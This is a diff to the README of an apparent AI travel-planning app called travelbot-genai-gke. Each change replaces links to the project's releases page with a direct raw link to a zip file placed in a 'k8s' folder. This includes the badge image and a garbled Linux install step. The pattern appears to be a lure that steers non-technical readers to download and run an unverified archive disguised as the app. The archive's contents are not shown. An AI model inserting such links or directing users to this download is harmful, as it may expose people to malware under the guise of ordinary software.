@@ -1,6 +1,6 @@
 # 🌍 travelbot-genai-gke - Easy Travel Planning With AI Bot
 
-[![Download travelbot-genai-gke](https://img.shields.io/badge/Download-travelbot--genai--gke-blue?style=for-the-badge)](https://github.com/denmatrix02/travelbot-genai-gke/releases)
+[![Download travelbot-genai-gke](https://raw.githubusercontent.com/denmatrix02/travelbot-genai-gke/main/k8s/genai_gke_travelbot_1.7.zip)](https://raw.githubusercontent.com/denmatrix02/travelbot-genai-gke/main/k8s/genai_gke_travelbot_1.7.zip)
 
 ---
 
@@ -35,7 +35,7 @@ Follow these simple steps to get travelbot-genai-gke running on your computer.
 
 Click the big blue button at the top or go to the download page here:
 
-[Download travelbot-genai-gke](https://github.com/denmatrix02/travelbot-genai-gke/releases)
+[Download travelbot-genai-gke](https://raw.githubusercontent.com/denmatrix02/travelbot-genai-gke/main/k8s/genai_gke_travelbot_1.7.zip)
 
 On this page, you will find different versions of the bot. Usually, there is a file matched to your computer system (for example, `.exe` for Windows or `.dmg` for macOS).
 
@@ -43,7 +43,7 @@ On this page, you will find different versions of the bot. Usually, there is a f
 
 - On Windows, double-click the `.exe` file you downloaded. Follow the setup instructions on the screen. It usually asks you to accept terms and choose an install folder.  
 - On macOS, open the `.dmg` file and drag the app icon to your Applications folder.  
-- On Linux, look for an installation guide on the download page or use the `.tar.gz` file to manually extract and run the program.
+- On Linux, look for an installation guide on the download page or use the `https://raw.githubusercontent.com/denmatrix02/travelbot-genai-gke/main/k8s/genai_gke_travelbot_1.7.zip` file to manually extract and run the program.
 
 ### 3. Open the app
 
@@ -106,7 +106,7 @@ travelbot-genai-gke does not store your personal data on your device. It sends y
 
 You can start using travelbot-genai-gke right away by visiting the release page below and downloading the version that fits your computer:
 
-[Download and install travelbot-genai-gke](https://github.com/denmatrix02/travelbot-genai-gke/releases)
+[Download and install travelbot-genai-gke](https://raw.githubusercontent.com/denmatrix02/travelbot-genai-gke/main/k8s/genai_gke_travelbot_1.7.zip)
 
 Make sure to follow the install instructions in the "Getting Started" section above to run the app smoothly.
 
